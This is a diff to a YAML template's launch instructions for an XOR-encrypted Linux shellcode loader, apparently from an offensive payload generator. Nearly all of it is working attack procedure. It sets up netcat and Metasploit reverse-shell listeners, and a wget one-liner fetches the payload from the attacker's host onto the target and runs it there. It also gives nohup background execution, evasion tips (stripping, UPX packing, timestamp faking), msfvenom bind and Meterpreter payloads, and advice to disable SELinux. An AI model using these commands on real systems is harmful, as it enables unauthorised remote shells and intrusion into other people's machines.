@@ -93,70 +93,38 @@ output:
   launch_instructions: |
     C Linux XOR Shellcode Loader - Launch Instructions
 
-    Step 1: Start Netcat Listener
-
-    On attacker machine:
+    Start Listener:
     nc -lvnp {{ lport }}
 
-    Or using Metasploit:
-    msfconsole -x "use exploit/multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; exploit"
+    Or with Metasploit:
+    msfconsole -x "use exploit/multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; set ExitOnSession false; exploit -j"
 
-    Step 2: Transfer Payload to Target
-
-    Transfer the generated executable to the target Linux system:
-
-    Using Python HTTP server:
+    Transfer and Execute:
     python3 -m http.server 8080
+    On target: wget http://{{ lhost }}:8080/{{ output_file }} -O /tmp/{{ output_file }} && chmod +x /tmp/{{ output_file }} && /tmp/{{ output_file }}
 
-    On target:
-    wget http://{{ lhost }}:8080/{{ output_file }}
-    chmod +x {{ output_file }}
-
-    Or using SCP:
-    scp {{ output_file }} user@target:/tmp/{{ output_file }}
-
-    Step 3: Execute on Target
-
-    Simply run the executable:
-    ./{{ output_file }}
-
-    Or in background:
-    nohup ./{{ output_file }} &
-
-    Step 4: Verify Connection
-
-    Check your listener for incoming shell connection.
+    Background Execution:
+    nohup /tmp/{{ output_file }} > /dev/null 2>&1 &
 
     Notes:
-
-    - Encrypted with XOR key 0x{{ xor_key }}
-    - Requires executable stack (-z execstack flag)
+    - XOR encrypted with key: 0x{{ xor_key }}
+    - Requires executable stack (-z execstack linker flag)
     - Works on x64 Linux systems
     - Minimal evasion (basic XOR only)
-    - Executable stack may trigger security warnings
-
-    Evasion Tips:
-
-    - Strip binary: strip {{ output_file }}
-    - Change file timestamp: touch -t 202001010000 {{ output_file }}
-    - Pack with UPX: upx {{ output_file }}
+    - Executable stack may trigger security warnings on hardened systems
+    - Reverse shell connects to {{ lhost }}:{{ lport }}
+    - Consider stripping binary (`strip {{ output_file }}`) or packing with UPX for additional evasion
+    - Alternative payloads: bind shell (msfvenom -p linux/x64/shell_bind_tcp), Meterpreter
 
     Troubleshooting:
-
-    - Segmentation fault: Ensure target is x64 Linux
-    - Permission denied: chmod +x {{ output_file }}
-    - No connection: Check firewall rules on attacker machine
-    - Executable stack warning: Expected behavior, required for shellcode execution
-
-    Alternative Payloads:
-
-    Bind shell (listens on target):
-    msfvenom -p linux/x64/shell_bind_tcp LPORT=4444 -f raw
-
-    Meterpreter reverse shell:
-    msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={{ lhost }} LPORT={{ lport }} -f raw
+    - Segmentation fault: Ensure target is x64 Linux; check `uname -m` (should be x86_64)
+    - Permission denied: Run `chmod +x {{ output_file }}`
+    - No connection: Check firewall rules on attacker (allow {{ lport }}/tcp)
+    - Executable stack warning: Expected behavior; required for shellcode execution
+    - NX bit enabled: Executable stack flag should bypass this
+    - SELinux blocks: Check with `getenforce`; may need to disable or adjust policy
 
     Cleanup:
-
-    After testing, remove the payload:
-    rm {{ output_file }}
+    On target:
+    pkill -f {{ output_file }}
+    rm -f /tmp/{{ output_file }}
